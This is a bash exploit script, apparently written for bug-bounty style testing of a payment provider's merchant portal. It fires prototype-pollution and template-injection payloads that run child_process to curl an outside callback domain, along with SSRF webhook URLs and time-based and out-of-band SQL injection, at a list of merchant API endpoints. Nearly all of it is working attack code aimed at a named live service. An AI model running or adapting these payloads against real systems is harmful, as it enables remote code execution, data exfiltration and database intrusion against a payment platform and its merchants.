#!/bin/bash
# OOB Callback Tests — PayCools (merchant.paycools.com)
# Domain: testrce.6u.gg
#
# PayCools confirmed using Lodash _.template()
# Key vector: prototype pollution via __proto__.sourceURL
# The sourceURL gets injected into Function() constructor body
#
# From the source:
#   "sourceURL="+(ft.call(t,"sourceURL")?(t.sourceURL+"").replace(/\s/g," ")
#                :"lodash.templateSources["+ ++Yt+"]")+"\n"
#
# If __proto__.sourceURL reaches template options, it executes as JS.

API="https://api.paycools.com"  # adjust if different
MERCHANT_API="https://merchant.paycools.com/api"  # adjust
OOB="testrce.6u.gg"
TOKEN="YOUR_JWT_HERE"
MERCHANT_ID="YOUR_MERCHANT_ID"

H1="Authorization: Bearer $TOKEN"
H2="Content-Type: application/json"

echo "=== PayCools OOB RCE Tests ==="
echo "Monitor $OOB for callbacks"
echo ""

# ─────────────────────────────────────────────────────────────
# TEST 1: Prototype Pollution + _.template() sourceURL RCE
# This is the confirmed vector from the source code.
# If any JSON body gets parsed with a vulnerable merge/assign
# and later flows into _.template(), sourceURL executes.
# ─────────────────────────────────────────────────────────────

echo "--- Prototype Pollution + sourceURL ---"

# Try every endpoint that accepts JSON POST/PUT
# The __proto__.sourceURL payload needs to:
# 1. Get parsed by a vulnerable deep-merge (lodash.merge, lodash.defaultsDeep)
# 2. Pollute Object.prototype.sourceURL
# 3. Then a _.template() call picks it up

PROTO_PAYLOAD_1='{
  "__proto__": {
    "sourceURL": "\nreturn require(\"child_process\").exec(\"curl http://'"$OOB"'/paycools-proto-1\")//"
  }
}'

PROTO_PAYLOAD_2='{
  "constructor": {
    "prototype": {
      "sourceURL": "\nreturn require(\"child_process\").exec(\"curl http://'"$OOB"'/paycools-proto-2\")//"
    }
  }
}'

# Variant with evaluate pattern (the "s" flag in _.template source)
PROTO_PAYLOAD_3='{
  "__proto__": {
    "sourceURL": "\n};return require(\"child_process\").execSync(\"curl http://'"$OOB"'/paycools-proto-3\");//"
  }
}'

# Common merchant endpoints — adjust paths based on what you find
ENDPOINTS=(
  "/api/merchant/profile"
  "/api/merchant/settings"
  "/api/merchant/store"
  "/api/transaction"
  "/api/report"
  "/api/report/generate"
  "/api/payout"
  "/api/payment/config"
  "/api/webhook"
  "/api/notification"
  "/api/user/profile"
  "/api/user/settings"
)

for ep in "${ENDPOINTS[@]}"; do
  echo "[PP1] POST $ep"
  curl -sk "$MERCHANT_API$ep" \
    -X POST -H "$H1" -H "$H2" \
    -d "$PROTO_PAYLOAD_1" \
    -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null

  echo "[PP1] PUT $ep"
  curl -sk "$MERCHANT_API$ep" \
    -X PUT -H "$H1" -H "$H2" \
    -d "$PROTO_PAYLOAD_1" \
    -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
done

echo ""
echo "--- Payload variant 2 (constructor.prototype) ---"
for ep in "/api/merchant/profile" "/api/report/generate" "/api/user/settings"; do
  echo "[PP2] POST $ep"
  curl -sk "$MERCHANT_API$ep" \
    -X POST -H "$H1" -H "$H2" \
    -d "$PROTO_PAYLOAD_2" \
    -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
done

echo ""
echo "--- Payload variant 3 (sourceURL with function escape) ---"
for ep in "/api/merchant/profile" "/api/report/generate" "/api/user/settings"; do
  echo "[PP3] POST $ep"
  curl -sk "$MERCHANT_API$ep" \
    -X POST -H "$H1" -H "$H2" \
    -d "$PROTO_PAYLOAD_3" \
    -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
done

# ─────────────────────────────────────────────────────────────
# TEST 2: Direct SSTI in string fields
# If any user-controlled string reaches _.template() as the
# template string itself (not just options), these fire.
# ─────────────────────────────────────────────────────────────

echo ""
echo "--- Direct SSTI in string fields ---"

SSTI_PAYLOADS=(
  '${require("child_process").exec("curl http://'"$OOB"'/paycools-ssti-interp")}'
  '<%= global.process.mainModule.require("child_process").execSync("curl http://'"$OOB"'/paycools-ssti-eval") %>'
  '<%- global.process.mainModule.require("child_process").execSync("curl http://'"$OOB"'/paycools-ssti-esc") %>'
)

for payload in "${SSTI_PAYLOADS[@]}"; do
  echo "[SSTI] report/generate with name=$payload"
  curl -sk "$MERCHANT_API/api/report/generate" \
    -X POST -H "$H1" -H "$H2" \
    -d "{\"name\": \"$payload\", \"type\": \"transactions\", \"merchantId\": \"$MERCHANT_ID\"}" \
    -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null

  echo "[SSTI] merchant/store with storeName=$payload"
  curl -sk "$MERCHANT_API/api/merchant/store" \
    -X POST -H "$H1" -H "$H2" \
    -d "{\"storeName\": \"$payload\", \"merchantId\": \"$MERCHANT_ID\"}" \
    -o /dev/null -w "  HTTP %{http_code}\n" --max-time 10 2>/dev/null
done

# ─────────────────────────────────────────────────────────────
# TEST 3: SSRF via webhook/callback URLs
# Merchant portals often have webhook configuration
# ─────────────────────────────────────────────────────────────

echo ""
echo "--- SSRF via webhook/callback URLs ---"

curl -sk "$MERCHANT_API/api/webhook" \
  -X POST -H "$H1" -H "$H2" \
  -d "{\"url\": \"http://$OOB/paycools-ssrf-webhook\", \"merchantId\": \"$MERCHANT_ID\"}" \
  -o /dev/null -w "HTTP %{http_code}\n" --max-time 10 2>/dev/null

curl -sk "$MERCHANT_API/api/payment/config" \
  -X PUT -H "$H1" -H "$H2" \
  -d "{\"callbackUrl\": \"http://$OOB/paycools-ssrf-payment\", \"redirectUrl\": \"http://$OOB/paycools-ssrf-redirect\", \"merchantId\": \"$MERCHANT_ID\"}" \
  -o /dev/null -w "HTTP %{http_code}\n" --max-time 10 2>/dev/null

curl -sk "$MERCHANT_API/api/notification" \
  -X POST -H "$H1" -H "$H2" \
  -d "{\"webhookUrl\": \"http://$OOB/paycools-ssrf-notif\", \"merchantId\": \"$MERCHANT_ID\"}" \
  -o /dev/null -w "HTTP %{http_code}\n" --max-time 10 2>/dev/null

# ─────────────────────────────────────────────────────────────
# TEST 4: SQLi on search/filter endpoints
# ─────────────────────────────────────────────────────────────

echo ""
echo "--- SQLi (time-based blind + OOB) ---"

curl -sk "$MERCHANT_API/api/transaction?search=test'%20AND%20SLEEP(5)--" \
  -H "$H1" -o /dev/null -w "HTTP %{http_code} (>5s=vuln)\n" --max-time 12 2>/dev/null

curl -sk "$MERCHANT_API/api/transaction?merchantId=$MERCHANT_ID&search=1'%20UNION%20SELECT%20LOAD_FILE(CONCAT('\\\\\\\\','sqli.',(SELECT%20version()),'.$OOB\\\\a'))--" \
  -H "$H1" -o /dev/null -w "HTTP %{http_code}\n" --max-time 10 2>/dev/null

echo ""
echo "=== Done. Check $OOB dashboard ==="
echo ""
echo "Priority callbacks:"
echo "  /paycools-proto-*  = Prototype Pollution + RCE via sourceURL (P1)"
echo "  /paycools-ssti-*   = Direct template injection RCE (P1)"
echo "  /paycools-ssrf-*   = Server-Side Request Forgery (P2)"
echo "  /sqli.*            = SQL Injection OOB (P1)"
